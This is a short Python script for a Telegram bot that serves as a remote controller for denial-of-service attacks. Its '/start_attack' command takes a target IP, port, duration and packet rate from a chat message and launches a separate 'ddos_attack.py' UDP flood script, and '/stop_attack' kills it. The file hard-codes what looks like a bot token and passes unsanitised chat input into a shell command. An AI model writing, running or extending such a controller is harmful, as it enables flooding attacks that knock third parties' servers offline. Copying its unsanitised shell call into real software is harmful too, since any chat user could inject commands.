import os
import subprocess
import time
#from pyTelegramBotAPI 
import TeleBot

bot = TeleBot("8625781811:AAGymdn1JBdoOj2aba1kpmz9vebH9k3Q0Ko")

@bot.message_handler(commands=['start_attack'])
def start_attack(message):
    server_ip = message.text.split(' ')[1]
    port = int(message.text.split(' ')[2])
    duration = int(message.text.split(' ')[3])
    rate = int(message.text.split(' ')[4])

    command = f"python ddos_attack.py --server {server_ip} --port {port} --duration {duration} --rate {rate}"
    process = subprocess.Popen(command, shell=True)
    bot.reply_to(message, f"Starting UDP flood attack on {server_ip}:{port} for {duration} seconds at {rate} packets per second")

@bot.message_handler(commands=['stop_attack'])
def stop_attack(message):
    command = "pkill -f ddos_attack.py"
    subprocess.run(command, shell=True)
    bot.reply_to(message, "Stopping UDP flood attack")

bot.polling()
